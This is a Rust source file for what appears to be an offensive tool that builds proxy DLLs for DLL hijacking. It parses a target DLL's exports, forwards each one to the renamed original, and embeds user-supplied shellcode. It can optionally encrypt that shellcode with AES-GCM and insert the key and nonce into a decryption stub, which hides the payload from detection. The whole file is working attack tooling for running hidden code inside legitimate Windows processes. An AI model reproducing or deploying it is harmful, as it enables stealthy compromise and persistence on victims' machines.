use aes_gcm::{
    aead::{AeadCore, AeadMutInPlace, KeyInit, OsRng},
    Aes256Gcm,
};
use clap::Parser;
use std::fs;
use std::fs::File;
use std::io::Write;
use std::str;

pub mod pe_parser;

#[derive(Default)]
struct EncArgs {
    pub key: [u8; 32],
    pub nonce: [u8; 12],
}

#[derive(Parser, Debug)]
#[command(author, version, about, long_about = None)]
struct Args {
    #[arg(short, long)]
    pub dll: std::path::PathBuf,
    #[arg(short, long)]
    pub shellcode: Option<std::path::PathBuf>,
    #[arg(short, long)]
    pub output: Option<std::path::PathBuf>,
    #[arg(short, long)]
    pub resources: Option<std::path::PathBuf>,
    #[arg(short, long)]
    pub encryption: Option<String>,
}

fn join_vec(nums: &[u8], sep: &str) -> String {
    let str_nums: Vec<String> = nums.iter().map(|n| n.to_string()).collect();

    str_nums.join(sep)
}

fn encrypt_aes(shellcode: &mut Vec<u8>) -> EncArgs {
    let key = Aes256Gcm::generate_key(OsRng);
    let mut cipher = Aes256Gcm::new(&key);
    let nonce = Aes256Gcm::generate_nonce(&mut OsRng);
    cipher
        .encrypt_in_place(&nonce, b"", shellcode)
        .expect("Could not encrypt shellcode");
    EncArgs {
        key: key.as_slice().try_into().expect("Key did not fit"),
        nonce: nonce.as_slice().try_into().expect("Nonce did not fit"),
    }
}

fn main() -> std::io::Result<()> {
    let args = Args::parse();
    println!("Proxying {:?}", args.dll);

    let mut shellcode = if args.shellcode.is_some() {
        let shellcode_path = args.shellcode.unwrap();
        println!("Embedding shellcode {:?}", shellcode_path);
        fs::read(&shellcode_path).expect("Could not read shellcode file")
    } else {
        println!("No shellcode argument given - skipping");
        Default::default()
    };

    let mut output = if args.output.is_some() {
        args.output.unwrap()
    } else {
        std::path::PathBuf::from("output")
    };

    let mut resource_path = if args.resources.is_some() {
        args.resources.unwrap()
    } else {
        std::path::PathBuf::from(".\\")
    };

    let contents = fs::read(&args.dll).expect("Could not read dll file");

    let file_name = args.dll.file_stem().unwrap().to_str().unwrap();

    let pe_file = pe_parser::parse(contents);
    if pe_file.x64 {
        println!("Parsed an x64 PE file");
    } else {
        println!("Parsed an x86 PE file");
    }

    let export_table = pe_file.export_table;
    println!(
        "Found {} exported functions",
        export_table.array_of_names.len()
    );

    let mut function_exports = "".to_owned();
    for i in 0..export_table.array_of_names.len() {
        let function_export = format!(
            "    .section .drectve\n    .asciz \"-export:{}={}_orig.{},@{}\"\n",
            export_table.array_of_names[i],
            file_name,
            export_table.array_of_names[i],
            export_table.array_of_ordinals[i]
        );
        function_exports.push_str(&function_export);
    }

    resource_path.push("export.rs");
    let content_export_asm = fs::read_to_string(&resource_path).expect("Could not read export.rs");
    resource_path.pop();

    let export_asm = content_export_asm.replace("{}", function_exports.as_str());

    resource_path.push("template.rs");
    let contents = fs::read_to_string(&resource_path).expect("Could not read template.rs");
    resource_path.pop();

    fs::create_dir(&output)?;

    let mut content_shellcode_stub = Default::default();
    if shellcode.len() > 0 {
        let enc_algo = if args.encryption.is_some() {
            if args.encryption.unwrap().to_lowercase() == "aes" {
                println!("Using AES encryption");
                resource_path.push("aes.rs");
                let tmp_enc_algo = fs::read_to_string(&resource_path).expect("Could not read aes.rs");
                resource_path.pop();
                let enc_args = encrypt_aes(&mut shellcode);
                tmp_enc_algo
                    .replace("{KEY}", join_vec(&enc_args.key, ",").as_str())
                    .replace("{NONCE}", join_vec(&enc_args.nonce, ",").as_str())
            } else {
                panic!("Unkown encryption algorithm");
            }
        } else {
            println!("No encryption defined - embedding plain shellcode");
            String::from("let dec_shellcode = shellcode::SHELLCODE.to_vec();")
        };

        resource_path.push("shellcode_template.rs");
        let content_shellcode_template =
            fs::read_to_string(&resource_path).expect("Could not read shellcode_template.rs");
        resource_path.pop();

        let shellcode_str = join_vec(&shellcode, ",");

        let content_shellcode = content_shellcode_template
            .replace("{SIZE}", shellcode.len().to_string().as_str())
            .replace("{SHELLCODE}", shellcode_str.as_str());

        output.push("shellcode.rs");
        let mut file = File::create(&output).expect("Could not create shellcode.rs");
        file.write_all(content_shellcode.as_bytes())?;
        println!("Wrote shellcode to {:?}", &output);
        output.pop();

        resource_path.push("shellcode_stub.rs");
        content_shellcode_stub =
            fs::read_to_string(&resource_path).expect("Could not read shellcode_stub.rs");
        resource_path.pop();
        content_shellcode_stub = content_shellcode_stub.replace("{ENC}", &enc_algo)
    }

    output.push("proxy.rs");
    let mut file = File::create(&output)?;
    file.write_all(
        contents
            .replace("{}", export_asm.as_str())
            .replace("{SHELLCODE_STUB}", &content_shellcode_stub)
            .as_bytes(),
    )?;
    println!("Wrote proxy dll template to {:?}", output);
    output.pop();

    output.push("build.rs");
    resource_path.push("build.rs");
    fs::copy(&resource_path, &output).expect("Could not create build.rs");
    output.pop();
    resource_path.pop();
    output.push("Cargo.toml");
    resource_path.push("Cargo.toml");
    fs::copy(&resource_path, &output).expect("Could not create Cargo.toml");

    Ok(())
}
